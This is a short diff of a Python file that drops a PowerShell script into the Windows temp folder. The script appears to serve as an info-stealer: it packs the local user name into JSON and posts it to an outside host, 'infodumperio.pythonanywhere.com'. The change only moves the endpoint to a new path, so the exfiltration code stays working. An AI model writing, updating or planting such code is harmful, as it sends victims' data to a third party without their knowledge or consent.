@@ -19,7 +19,7 @@ if not os.path.exists(f"{os.path.expandvars('%TEMP%')}\\sc02.ps1"):
         Usuario = $nomeUsuario
     } | ConvertTo-Json
 
-    $url = "https://infodumperio.pythonanywhere.com/receber-solicitacao"
+    $url = "https://infodumperio.pythonanywhere.com/receber-solicitacao-alpha"
 
     $response = Invoke-RestMethod -Uri $url -Method Post -Body $jsonData -ContentType "application/json"
 
